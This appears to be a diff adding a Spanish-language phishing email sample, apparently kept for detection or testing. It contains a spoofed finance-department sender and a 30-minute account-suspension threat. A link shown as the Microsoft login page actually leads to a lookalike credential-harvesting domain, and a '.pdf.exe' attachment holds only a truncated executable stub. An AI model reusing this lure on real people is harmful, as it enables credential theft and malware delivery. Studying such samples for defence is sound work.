@@ -1,0 +1,42 @@
+Return-Path: <bounce-8891@mailer-darkhost.ru>
+Received: from mail.mailer-darkhost.ru (mail.mailer-darkhost.ru [185.220.101.45])
+    by mx.empresa-oficial.com with ESMTP id 9912A84F
+    for <empleado.contabilidad@empresa-oficial.com>; Mon, 09 Nov 2026 09:14:22 +0000
+Authentication-Results: mx.empresa-oficial.com;
+    spf=fail (sender IP is 185.220.101.45) smtp.mailfrom=mailer-darkhost.ru;
+    dkim=none;
+    dmarc=fail action=quarantine header.from=empresa-oficial.com
+From: "Departamento de Finanzas" <pagos@empresa-oficial.com>
+Reply-To: "Cobranza Urgente" <cobros@facturacion-urgente.xyz>
+To: <empleado.contabilidad@empresa-oficial.com>
+Subject: [URGENTE] Suspensión de Cuenta y Factura Vencida #FAC-9921
+Date: Mon, 09 Nov 2026 09:14:20 +0000
+Message-ID: <20261109091420.9912@mailer-darkhost.ru>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============BOUNDARY_PHISH_001=="
+
+--===============BOUNDARY_PHISH_001==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html>
+  <body>
+    <p>Estimado colaborador,</p>
+    <p>Detectamos un problema grave con el pago de la factura corporativa de este mes.
+    Si no valida sus credenciales corporativas en los próximos <strong>30 minutos</strong>,
+    su acceso a Microsoft 365 será bloqueado inmediatamente.</p>
+    <p>Haga clic en nuestro portal oficial seguro para validar su cuenta:</p>
+    <p><a href="http://micr0soft-auth-portal.xyz/office365/login.php?user=contabilidad">https://login.microsoftonline.com/empresa-oficial</a></p>
+    <p>También adjuntamos el comprobante pendiente en el archivo <code>Factura_Pendiente_Nov2026.pdf.exe</code>.</p>
+  </body>
+</html>
+
+--===============BOUNDARY_PHISH_001==
+Content-Type: application/octet-stream; name="Factura_Pendiente_Nov2026.pdf.exe"
+Content-Disposition: attachment; filename="Factura_Pendiente_Nov2026.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAECAA==
+--===============BOUNDARY_PHISH_001==--
